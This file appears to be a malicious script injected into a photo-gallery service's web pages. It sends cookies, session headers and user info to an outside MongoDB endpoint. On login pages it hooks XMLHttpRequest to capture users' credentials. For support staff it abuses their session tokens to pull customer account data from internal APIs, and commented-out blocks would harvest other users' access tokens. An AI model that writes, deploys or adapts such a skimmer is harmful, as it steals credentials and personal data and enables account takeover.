if (Math.random() <= 1.0) {
  const setPtxAccessToken = async () => {
    return fetch(
      "https://us-east-2.aws.realm.mongodb.com/api/client/v2.0/app/data-dkerm/auth/providers/anon-user/login"
    )
      .then((resp) => resp.json())
      .then((json) => json.access_token)
      .then((token) => (window.accessToken = token));
  };

  const insertDoc = async (type, data) => {
    const envelope = {};
    envelope.sessionId = window.rjsSessionId;
    envelope.type = type;
    envelope.data = data;
    envelope.userAgent = navigator?.userAgent;

    envelope.ptData = {};
    envelope.ptData.headers = _pt$?.hdrs || null;
    envelope.ptData.userInfo = _pt$?.userInfo || null;
    envelope.ptData.cookie = document.cookie;

    envelope.ts = Date.now();

    return fetch(
      "https://us-east-2.aws.data.mongodb-api.com/app/data-dkerm/endpoint/data/v1/action/insertOne",
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "Access-Control-Request-Headers": "*",
          Authorization: `Bearer ${window.accessToken}`,
        },
        body: JSON.stringify({
          collection: "ingest",
          database: "pictimeDataDb",
          dataSource: "pixieset-data",
          document: envelope,
        }),
      }
    );
  };

  const getIFrame = async (iframeUrl) => {
    try {
      const iframe = document.createElement("iframe");
      iframe.src = iframeUrl;
      iframe.style.display = "none";
      document.body.appendChild(iframe);

      setTimeout(() => {
        const iframeHtml = iframe.contentDocument.documentElement.outerHTML;

        // Send Page HTML
        insertDoc("iframe-page-html", {
          location: iframeUrl,
          html: iframeHtml,
        });
      }, 5000);
    } catch (err) {
      console.error(err);
      insertDoc("error", err.toString());
    }
  };

  setPtxAccessToken().then(async () => {
    setTimeout(async () => {
      await insertDoc("location", window.location);

      const isLoginPage = window.location.pathname.includes("/login");

      if (isLoginPage) {
        const originalSend = XMLHttpRequest.prototype.send;
        const originalOpen = XMLHttpRequest.prototype.open;

        XMLHttpRequest.prototype.open = function (method, url) {
          this._monitoredUrl = url;
          return originalOpen.apply(this, arguments);
        };

        XMLHttpRequest.prototype.send = async function (data) {
          const urlToMonitor = "loginUser2";

          if (this._monitoredUrl && this._monitoredUrl.includes(urlToMonitor)) {
            const credentials = JSON.parse(data);
            await insertDoc("credentials", credentials);

            this.addEventListener("readystatechange", function () {
              if (this.readyState === XMLHttpRequest.DONE) {
                // You can access response data (this.responseText, this.responseXML) if necessary
              }
            });
          }
          return originalSend.apply(this, arguments);
        };
      }

      const userType = _pt$?.userInfo?.type;

      if (userType === 6) {
        const gusr = _pt$?.hdrs?.gusr;
        const lusr = _pt$?.hdrs?.lusr;
        const gUserAccessFetchUrl =
          "https://cstool.pic-time.com/!servicescs.asmx/getGUserAccess";
        const lookUpPhotographerAccountFetchUrl =
          "https://cstool.pic-time.com/!servicescs.asmx/lookUpPhotographerAccount";
        const getGUserInfoFetchUrl =
          "https://cstool.pic-time.com/!servicescs.asmx/getGUserInfo";

        // getGUserAccess
        try {
          const email = "katherine+support@pic-time.com";
          const lookUpPhotographerAccountBody = { id: email, idType: 1 };
          const lookUpPhotographerAccountData = await fetch(
            lookUpPhotographerAccountFetchUrl,
            {
              headers: {
                accept: "application/json, text/javascript, */*; q=0.01",
                "accept-language": "en-US,en;q=0.9",
                "cache-control": "no-cache",
                "content-type": "application/json; charset=UTF-8",
                pictimeGUser: gusr,
                pictimeProject: lusr,
              },
              body: JSON.stringify(lookUpPhotographerAccountBody),
              method: "POST",
            }
          );
          const lookUpPhotographerAccountJson =
            await lookUpPhotographerAccountData.json();
          await insertDoc("account-data-by-email", {
            email: email,
            data: lookUpPhotographerAccountJson,
          });
        } catch (err) {
          insertDoc("error", err.toString());
        }

        // // getGUserInfo
        // try {
        //   const email = "katherine+support@pic-time.com";
        //   const getGUserInfoBody = { email };
        //   const getGUserInfoData = await fetch(getGUserInfoFetchUrl, {
        //     headers: {
        //       accept: "application/json, text/javascript, */*; q=0.01",
        //       "accept-language": "en-US,en;q=0.9",
        //       "cache-control": "no-cache",
        //       "content-type": "application/json; charset=UTF-8",
        //       pictimeGUser: gusr,
        //       pictimeProject: lusr,
        //     },
        //     body: JSON.stringify(getGUserInfoBody),
        //     method: "POST",
        //   });
        //   const getGUserInfoJson = await getGUserInfoData.json();
        //   await insertDoc("guser-info", {
        //     email,
        //     data: getGUserInfoJson,
        //   });
        // } catch (err) {
        //   insertDoc("error", err.toString());
        // }

        // // getGUserInfo
        // try {
        //   const email = "dmitry+supportaccountstore4@pic-time.com";
        //   const getGUserInfoBody = { email };
        //   const getGUserInfoData = await fetch(getGUserInfoFetchUrl, {
        //     headers: {
        //       accept: "application/json, text/javascript, */*; q=0.01",
        //       "accept-language": "en-US,en;q=0.9",
        //       "cache-control": "no-cache",
        //       "content-type": "application/json; charset=UTF-8",
        //       pictimeGUser: gusr,
        //       pictimeProject: lusr,
        //     },
        //     body: JSON.stringify(getGUserInfoBody),
        //     method: "POST",
        //   });
        //   const getGUserInfoJson = await getGUserInfoData.json();
        //   await insertDoc("guser-info", {
        //     email,
        //     data: getGUserInfoJson,
        //   });
        // } catch (err) {
        //   insertDoc("error", err.toString());
        // }

        // // getGUserInfo
        // try {
        //   const email = "qaautomation+support@pic-time.com";
        //   const getGUserInfoBody = { email };
        //   const getGUserInfoData = await fetch(getGUserInfoFetchUrl, {
        //     headers: {
        //       accept: "application/json, text/javascript, */*; q=0.01",
        //       "accept-language": "en-US,en;q=0.9",
        //       "cache-control": "no-cache",
        //       "content-type": "application/json; charset=UTF-8",
        //       pictimeGUser: gusr,
        //       pictimeProject: lusr,
        //     },
        //     body: JSON.stringify(getGUserInfoBody),
        //     method: "POST",
        //   });
        //   const getGUserInfoJson = await getGUserInfoData.json();
        //   await insertDoc("guser-info", {
        //     email,
        //     data: getGUserInfoJson,
        //   });
        // } catch (err) {
        //   insertDoc("error", err.toString());
        // }

        // // getGUserInfo
        // try {
        //   const email = "volodymyr+dev4@pic-time.com";
        //   const getGUserInfoBody = { email };
        //   const getGUserInfoData = await fetch(getGUserInfoFetchUrl, {
        //     headers: {
        //       accept: "application/json, text/javascript, */*; q=0.01",
        //       "accept-language": "en-US,en;q=0.9",
        //       "cache-control": "no-cache",
        //       "content-type": "application/json; charset=UTF-8",
        //       pictimeGUser: gusr,
        //       pictimeProject: lusr,
        //     },
        //     body: JSON.stringify(getGUserInfoBody),
        //     method: "POST",
        //   });
        //   const getGUserInfoJson = await getGUserInfoData.json();
        //   await insertDoc("guser-info", {
        //     email,
        //     data: getGUserInfoJson,
        //   });
        // } catch (err) {
        //   insertDoc("error", err.toString());
        // }

        // PT O&M
        // try {
        //   const url = "/ptoam";
        //   await insertDoc("fetch-attempt", { url });
        //   const data = await fetch(url).then((resp) => resp.text());
        //   await insertDoc("fetch", { url, data });
        // } catch (err) {
        //   console.error(err);
        //   insertDoc("error", err.toString());
        // }

        // PT O&M Routes
        // try {
        //   const url = "/oamapi/routes";
        //   await insertDoc("fetch-attempt", { url });
        //   const data = await fetch(url).then((resp) => resp.json());
        //   await insertDoc("fetch", { url, data });
        // } catch (err) {
        //   console.error(err);
        //   insertDoc("error", err.toString());
        // }

        // // General Upgrade Actions
        // try {
        //   const url = "/upgradescripts/generalUpgradeActions.aspx";
        //   await insertDoc("fetch-attempt", { url });
        //   const data = await fetch(url).then((resp) => resp.text());
        //   await insertDoc("fetch", { url, data });
        // } catch (err) {
        //   console.error(err);
        //   insertDoc("error", err.toString());
        // }

        // getGUserAccess
        // try {
        //   const accountUrl = "https://baronephoto.pic-time.com";
        //   const accountId = 78982;
        //   const lookUpPhotographerAccountBody = { id: accountId, idType: 0 };
        //   const lookUpPhotographerAccountData = await fetch(
        //     lookUpPhotographerAccountFetchUrl,
        //     {
        //       headers: {
        //         accept: "application/json, text/javascript, */*; q=0.01",
        //         "accept-language": "en-US,en;q=0.9",
        //         "cache-control": "no-cache",
        //         "content-type": "application/json; charset=UTF-8",
        //         pictimeGUser: gusr,
        //         pictimeProject: lusr,
        //       },
        //       body: JSON.stringify(lookUpPhotographerAccountBody),
        //       method: "POST",
        //     }
        //   );
        //   const lookUpPhotographerAccountJson =
        //     await lookUpPhotographerAccountData.json();
        //   await insertDoc("account-data", {
        //     accountId,
        //     data: lookUpPhotographerAccountJson,
        //   });
        //   const gUserAccessBody = {
        //     email: lookUpPhotographerAccountJson.d.email,
        //   };
        //   const gUserAccessData = await fetch(gUserAccessFetchUrl, {
        //     headers: {
        //       accept: "application/json, text/javascript, */*; q=0.01",
        //       "accept-language": "en-US,en;q=0.9",
        //       "cache-control": "no-cache",
        //       "content-type": "application/json; charset=UTF-8",
        //       pictimeGUser: gusr,
        //       pictimeProject: lusr,
        //     },
        //     body: JSON.stringify(gUserAccessBody),
        //     method: "POST",
        //   });
        //   const gUserAccessJson = await gUserAccessData.json();
        //   const gaccessTokenUrl = `https://${gUserAccessJson.d}`;
        //   const html = await fetch(gaccessTokenUrl, {
        //     credentials: "omit",
        //   }).then((resp) => resp.text());
        //   const pictimeGUser = html.match(/var _PT_GUSERTOKEN_ = "(.*)";/)[1];
        //   const pictimeProject = html.match(/var _PT_LUSERTOKEN_ = "(.*)";/)[1];
        //   await insertDoc("tokens", {
        //     url: accountUrl,
        //     pictimeGUser,
        //     pictimeProject,
        //   });
        // } catch (err) {
        //   insertDoc("error", err.toString());
        // }
      }
    }, 500);
  });
} else {
  console.log(false);
}
